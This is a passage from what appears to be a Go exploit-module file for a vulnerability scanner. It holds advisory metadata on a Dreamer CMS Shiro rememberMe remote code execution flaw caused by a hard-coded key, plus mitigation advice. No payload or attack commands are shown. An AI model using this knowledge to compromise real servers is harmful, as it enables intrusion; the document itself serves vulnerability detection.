            "Name": "dreamer cms shiro rememberme rce",
            "Product": "Dreamer CMS",
            "Description": "<p><span style=\"color: rgb(22, 51, 102); font-size: 16px;\"><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">Dreamer CMS is an open source, free and simplified CMS system.</span></span></p><p><span style=\"color: rgb(22, 51, 102); font-size: 16px;\"><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">Dreamer CMS&nbsp;</span>&nbsp;</span>v3.5.0 and earlier versions have a security vulnerability, which stems from the existence of hard coded shiro-key in the software, which can be used by attackers to execute arbitrary code.</p>",
            "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:&nbsp;<a href=\"https://gitee.com/isoftforce/dreamer_cms\">https://gitee.com/isoftforce/dreamer_cms</a></p><p><a href=\"https://gitee.com/mingSoft/MCMS\"></a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.<br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10685"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
